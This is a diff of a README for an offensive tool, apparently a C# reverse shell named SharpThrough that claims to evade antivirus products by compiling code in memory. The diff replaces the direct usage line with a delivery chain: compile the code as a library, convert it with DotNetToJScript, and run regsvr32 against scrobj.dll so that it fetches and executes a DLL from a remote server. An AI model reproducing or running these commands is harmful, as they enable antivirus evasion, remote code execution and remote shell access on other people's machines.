@@ -6,10 +6,11 @@ Simple yet effective C# reverse shell, at the moment can bypass many (maybe all)
 Simple technique is used -> it compiles code in memory  
 IDE VS 2015 , csproj is available. Compile platform choiche is yours: suggested is x64  
 You can also compile it with :  
-```C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe  /unsafe /platform:x64 /out:sharpthrough.exe Program.cs```  
 ```
-Usage :
-sharpthrough.exe IP PORT
+Usage:
+C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe /target:library Program.cs
+./DotNetToJScript.exe -c SharpThrough.RS -o test.dll -u Program.dll
+regsvr32 /n /s /u /i:http://server/test.dll scrobj.dll
 ```
 
 ## SharpMeter
